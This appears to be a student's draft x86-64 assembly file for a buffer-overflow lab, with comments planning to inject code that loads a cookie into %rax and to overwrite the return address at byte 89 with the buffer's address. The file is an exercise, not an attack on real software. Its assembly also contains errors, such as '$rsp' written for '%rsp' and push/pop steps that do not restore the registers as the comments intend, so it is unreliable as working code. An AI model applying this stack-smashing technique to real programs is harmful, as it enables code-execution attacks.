# want to return cookie for test_exploit without disturbing stack 
# check that base and stack pointer are the same as before -- need 
# to check or just set 
# put address of start of buffer in return address spot 

# question: what is starting address of buffer? 

# idea: use this code for exploit code -- turn into hex code -- 
# and then put buffer address at return address at byte 89

exploit:
    push %rsp
    push %rbp 
    mov %rsp, %rbp 
    subq $0x20, $rsp # 20 is random num -- figure out how much to adjust by after we write and compile
    mov $0x622524ed, %rax  #cookie 

    #fix rbp and rsp - found in gdb - push rsp onto stack
    pop %rsp 
    pop %rbp 
    ret